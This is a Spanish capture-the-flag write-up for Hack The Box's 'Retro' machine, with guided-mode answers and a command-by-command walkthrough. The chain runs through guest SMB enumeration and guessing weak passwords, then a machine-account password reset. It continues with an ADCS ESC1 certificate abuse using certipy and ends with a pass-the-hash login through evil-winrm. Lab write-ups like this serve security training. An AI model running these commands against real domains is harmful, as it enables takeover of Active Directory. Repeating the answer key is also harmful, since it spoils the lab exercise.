---
title: Writeup retro - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - fawn
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina retro  en Hack The Box.
keywords:
  - writeup retro 
  - hack the box retro 
  - resolución máquina retro 
  - retro  hack the box
  - htb retro
---

### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Windows/Retro)
- 📺 **Resolución en vivo (completa)**: [Link](https://www.youtube.com/watch?v=opU8izCpLqg)
- 🧠 **Explicación resumida**: 

---

#easy #windows #nmap #ping #ad #activedirectory #smb #smbmap #netexec #certipy #/etc/hosts #evil-winrm #cat #grep #sed #impacket-lookupsid #certipy #esc1


---
# Guided Mode

1)¿Cuál es el nombre de dominio completo (FQDN) del controlador de dominio en Retro?
	DC.retro.vl

2)¿Cuál es el recurso compartido SMB no predeterminado que se puede leer con la cuenta de invitado?
	Trainees

3)¿Cuál es el nombre de la cuenta al que se hace referencia en el archivo Important.txt?
	trainee

4)¿Cuál es la contraseña del usuario en prácticas?
	trainee

5)¿Cómo se llama el recurso compartido al que puede acceder la cuenta de aprendiz y al que el invitado no puede acceder?
	notes

*La anterior pregunta es la flag de user.txt ubicada en el recurso "notas" de smb*
7)¿Cómo se llama la antigua cuenta de máquina que es compatible con versiones anteriores a Windows 2000?
	BANKING$

8)¿Cuál es el código de error que se devuelve al autenticarse como la cuenta de máquina BANKING$ con la contraseña predeterminada?
	NT_STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT

9)¿Cuál es el nombre común (CN) de la autoridad certificadora (CA) que emite certificados en el entorno de Servicios de certificados de Active Directory?
	retro-DC-CA

10)Retro tiene una plantilla ADCS que es vulnerable a una vulnerabilidad que puede utilizarse para explotar la inscripción de certificados solicitando certificados que suplantan la identidad de otros usuarios. ¿Cuál es el nombre pseudo ESC específico de esta vulnerabilidad?
	ESC1

------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.129.234.44
nmap -p- --open -vvv --min-rate 5000 -sS -n -Pn 10.129.234.44 -oG allPortsTCP
extractPorts allPortsTCP
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49664,49667,49669,61536,61549,61564,64548,64557 10.129.234.44 -oN targetTCP
nmap -sU --top-ports 200 -n -Pn 10.129.234.44 -oG allPortsUDP
extractPorts allPortsUDP
nmap -sCV -p53,88,123,389 10.129.234.44 -oN targetUDP
```

![[Retro1.png]]
![[Retro2.png]]
![[Retro3.png]]
![[Retro4.png]]
![[Retro5.png]]
![[Retro6.png]]

![[Retro31.png]]
![[Retro9.png]]

*Puertos TCP Importantes:*
	`445` [[smb]]
	`5985`[[evil-winrm]]

*Datos Importantes:*
Dice 2 dominios uno es retro.vl y el otro DC.retro.vl  por las dudas tambien voy a añadir elñ dc.retro.vl

------
# Agregar dominio al /etc/hosts

Con [[nvim]] logeados como sudo vamos a abrir el archivo /etc/hosts con `nvim /etc/hosts` para añadir los dominios
![[Retro37.png]]
```
10.129.234.44 retro.vl DC.retro.vl dc.retro.vl
```

![[Retro38.png]]

------
# Enumeracion con [[smbmap]] y [[smb]]
```
smbmap -u "guest" -p "" -P 445 -H retro.vl
```

![[Retro15.png]]
Vemos que podemos leer el recurso de *Trainees* asi que ahora con [[smb]] nos vamos a conectar

```
smbclient //10.129.234.44/Trainees -N -p 445
```

![[Retro11.png]]
Nos descargamos el archivo *Important.txt* con `get Important.txt` y lo abrimos con [[cat]] usando el comando `cat Important.txt`

![[Retro36.png]]
### La traduccion:

![[Retro35.png]]
Nos da a entender que las contraseñas van a ser faciles para que se las acurden los empleados

----
# Enumeracion [[impacket-lookupsid]], escalada al usuario trainess

```
impacket-lookupsid 'retro.vl/guest'@10.129.234.44 -no-pass
```
Puse usuario guest por que es el mas comun sin privilegios

![[Retro13.png]]
Ahora copie todo y lo puse en un archivo de texto que se llama *texto.txt*

```
498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: RETRO\Administrator (SidTypeUser)
501: RETRO\Guest (SidTypeUser)
502: RETRO\krbtgt (SidTypeUser)
512: RETRO\Domain Admins (SidTypeGroup)
513: RETRO\Domain Users (SidTypeGroup)
514: RETRO\Domain Guests (SidTypeGroup)
515: RETRO\Domain Computers (SidTypeGroup)
516: RETRO\Domain Controllers (SidTypeGroup)
517: RETRO\Cert Publishers (SidTypeAlias)
518: RETRO\Schema Admins (SidTypeGroup)
519: RETRO\Enterprise Admins (SidTypeGroup)
520: RETRO\Group Policy Creator Owners (SidTypeGroup)
521: RETRO\Read-only Domain Controllers (SidTypeGroup)
522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
525: RETRO\Protected Users (SidTypeGroup)
526: RETRO\Key Admins (SidTypeGroup)
527: RETRO\Enterprise Key Admins (SidTypeGroup)
553: RETRO\RAS and IAS Servers (SidTypeAlias)
571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
1000: RETRO\DC$ (SidTypeUser)
1101: RETRO\DnsAdmins (SidTypeAlias)
1102: RETRO\DnsUpdateProxy (SidTypeGroup)
1104: RETRO\trainee (SidTypeUser)
1106: RETRO\BANKING$ (SidTypeUser)
1107: RETRO\jburley (SidTypeUser)
1108: RETRO\HelpDesk (SidTypeGroup)
1109: RETRO\tblack (SidTypeUser)
```

Y ahora con [[cat]], [[grep]] y [[sed]] hice las sustituciones correspondientes con las regex para que me deje solo una lista de usuarios
cat texto.txt| grep -i "sidtypeuser" | sed 's/.*\\//' | sed 's/ .*//' > users.txt

![[Retro14.png]]
Tenemos todos estos usuarios y vemos el usuario trainee y en los recursos de SMB habiamos visto una carpeta llamada Trainees, asi que vamos a probar conectarnos con el usuario, pero todavia nos falta la contraseña, y como vimos en el archivo que se llamaba *Important.txt* las contraseñas son faciles, asi que vamos a probar el mismo usuario que contraseña

```
smbmap -u "trainee" -p "trainee" -P 445 -H retro.vl
```
![[Retro16.png]]
Al final la carpeta de trainees no nos sirvio, y vamos a la de notes y tenemos dos archivos

```
smbclient //10.129.234.44/Notes -U trainee --password=trainee -p 445
```

![[Retro17.png]]
Con el comando `get user.txt` y `get ToDo.txt` nos descargamos los archivos

El *user.txt* es la primera flag y ahora con `cat ToDo.txt` abrimos el archivo

![[Retro34.png]]

![[Retro33.png]]

---------
# Escalada de privilegios al usuario BANKING$ con [[changepass.py]]

Como vimos en el archivo *ToDo.txt* nos habla de un banco, cuando listamos los usuarios vimos al usuario *BANKING$* y si repetimos lo mismo de que las contraseñas van a ser faciles como en el primer archivo que leimos, probamos la contraseña. Probamos con BANKING\$:banking usando [[netexec]] y no da el error `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`

```
netexec smb 10.129.234.44 -u 'BANKING$' -p 'banking'
```

![[Retro18.png]]
Buscando en internet este error encontramos el siguiente [articulo](https://medium.com/@offsecdeer/finding-weak-ad-computer-passwords-e3dc1ed220df)
Donde nos dice que es un windows 2000 aprox y que la contraseña es correcta, pero no nos deja entrar por cuestiones de seguridad, pero que si cambiamos la contraseña vamos a entrar sin problemas

Buscamos este script de impacket [[changepass.py]] con [[find]] usando el comando `find / -name changepasswd.py 2>/dev/null`

![[Retro19.png]]
Lo encontramos en esta ruta asi que lo vamos a ejecutar `python3 /usr/share/doc/python3-impacket/examples/changepasswd.py retro.vl/BANKING\$@10.129.234.44 -newpass 'exploit' -p rpc-samr`
Tenemos que poner el dominio/usuario/ip. Luego con `-newpass` ponemos la nueva contraseña, y el `-p` es para el pipe

![[Retro20.png]]
Luego comprobamos con [[netexec]] que la contraseña se cambio correctamente con el comando `netexec smb 10.129.234.44 -u 'BANKING$' -p 'exploit'`

-------
# Escalada al usuario Administrator con [[certipy]] ESC1

Vamos a usar este [articulo](https://www-hackingarticles-in.translate.goog/a-detailed-guide-on-certipy/?_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=es) para usar el [[certipy]] y escalar prilegios


```
python3 /home/bunzo/.local/bin/certipy find -username 'BANKING$'@retro.vl -password 'exploit' -dc-ip 10.129.234.44 -vulnerable -enable -stdout
```
*Parametros:* 
	`find` Es para buscar 
	`-username` Usuario
	`-password` Contraseña
	`-dc-ip` Es la ip victima
	`-vulnerable` Indica que queremos detectar los templates con configuraciones inseguras
	`-enable` Si la CA está deshabilitada, pide que se habilite la inscripción (requiere que la cuenta tenga permisos suficientes).
	`-stdout` Muestra toda la informacion directamente en la salida edl comando

![[Retro22.png]]
![[Retro23.png]]
Nos da el template que se llama *RetroClients* y el CA que es *retro-DC-CA*. Y nos indica que hay una vulnerabilidad *ESC1*

Con este comando estamos intentando leer la ifnormacion de la cuienta Administrator utilizando las credenciales del usuario BANKING$

```
python3 /home/bunzo/.local/bin/certipy account -u 'BANKING$' -p exploit -dc-ip 10.129.234.44 -target 10.129.234.44 -user Administrator read
```
*Parametros:*
	`account` Indica que se va a trabajar con **cuentas de Active Directory** (crear, leer, modificar, eliminar atributos, etc.).
	`-user Administrator` Especifica que querés actuar sobre la cuenta Administrator.
	`read`Acción: leer atributos de esa cuenta (por ejemplo, descripción, SID, grupos, SPNs, etc.).
![[Retro24.png]]
Nos da el objectSid que lo vamos a usar a posteriori


Ahora con todos los datos que ya recopilamos vamos a hacer la solicitud para descargar el certificado

```
python3 /home/bunzo/.local/bin/certipy req -u 'BANKING$' -p exploit -dc-ip 10.129.234.44 -target 10.129.234.44 -ca retro-DC-CA -template 'RetroClients' -upn 'administrator@retro.vl' -sid 'S-1-5-21-2983547755-698260136-4283918172-500' -key-size 4096 -debug
```
*Parametros:*
	`req` Solicita un certificado a la CA
	`-ca ` Nombre de la Certificate Authority en el dominio.
	`-template` Plantilla de certificado que se va a usar; en laboratorios suele ser mal configurada para permitir enrollment de cualquier usuario.
	`-upn` Usuario objetivo que queremos impersonar con el certificado
	`-sid` SID del usuario objetivo, para que el certificado tenga la identidad correcta.
	`-key-size 4096` Si no poniamos este valor, nos daba un error por el tamaño de la key
	`-debug` Muestra información detallada de la operación para diagnóstico.

![[Retro28.png]]

Ahora nos vamos a utentificar en el dominio usando el certificado enves ed una contraseña tradicional
```
python3 /home/bunzo/.local/bin/certipy auth -pfx administrator.pfx -dc-ip 10.129.234.44
```
*Parametros:*
	`auth` Indica que se va a utentificar con un certificado
	`-pfx administrator.pfx` Es para indicar el archivo que contiene el certificado

![[Retro29.png]]


## Conexion a la maquina con [[evil-winrm]] usando el Hash

```shell
evil-winrm -i 10.129.234.44 -u Administrator -H 252fac7066d93dd009d4fd2cd0368389 -P 5985
```

Ya somo el usuario administrator y podemos catear la flag
![[Retro30.png]]



---
# Notas

Kerberos es un protocolo de autenticación de redes informáticas que verifica de forma segura las identidades de usuarios y servidores a través de una red no segura, evitando la transmisión de contraseñas en texto plano

Windows RPC es un servicio de Microsoft que permite la comunicación entre diferentes programas en distintos equipos, haciendo posible el desarrollo y la ejecución de sistemas operativos y aplicaciones distribuidas de forma eficiente


Para lo que es directorio activo puedo usar esta metodologia que aparece en [hacktricks](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)

rid es le identificador de cada usuario


Si no usamos el parametro -key-size 4096 nos va a dar este error de tamaño
![[Retro32.png]]